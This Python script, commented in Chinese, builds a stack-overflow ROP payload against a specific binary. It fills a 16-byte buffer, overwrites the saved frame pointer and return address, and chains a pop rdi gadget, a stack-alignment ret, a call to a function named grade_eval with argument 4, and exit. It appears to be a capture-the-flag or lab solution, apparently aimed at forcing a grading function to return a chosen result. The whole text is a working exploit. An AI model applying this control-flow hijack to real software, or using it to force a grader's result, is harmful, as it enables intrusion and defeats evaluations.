#!/usr/bin/env python3
import struct
import sys

POP_RDI_RET = 0x401A33  # __libc_csu_init 尾部 41 5f c3, 从 0x401a33 读即 pop rdi; ret
RET = 0x401A34          # 单条 ret, 用来补齐栈对齐
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0     # grade_eval 返回后退出


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


# 用 pop rdi; ret 把 4 装进 rdi, 再 ret 进 grade_eval;
# 中间插一个 ret, 让进入 grade_eval 时 rsp % 16 == 8.
payload  = b"D" * 16          # expression[16]
payload += b"E" * 8           # saved rbp
payload += p64(POP_RDI_RET)   # saved rip, 进入 gadget
payload += p64(4)             # pop rdi 取到的参数
payload += p64(RET)           # 对齐: 进入 grade_eval 时 rsp % 16 == 8
payload += p64(GRADE_EVAL)    # grade_eval(4)
payload += p64(EXIT_PLT)      # grade_eval 的 ret 落到 exit
payload += b"\n"
sys.stdout.buffer.write(payload)
